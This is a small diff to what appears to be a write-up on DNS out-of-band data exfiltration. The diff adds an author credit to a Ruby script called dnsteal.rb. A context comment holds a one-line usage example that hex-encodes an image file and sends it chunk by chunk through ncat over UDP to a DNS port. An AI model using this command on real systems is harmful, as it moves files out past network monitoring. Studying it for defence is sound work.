@@ -7,7 +7,7 @@ DNS out-band connection is usually allowed in local networks, which is the major
 **dnsteal.rb**
 ```ruby
 #!/usr/bin/env ruby
-#
+# KING SABRI | @KINGSABRI
 # for hex in $(xxd -p ethernet-cable.jpg); do echo $hex | ncat -u localhost 53 ; done
 # 
 require 'socket'
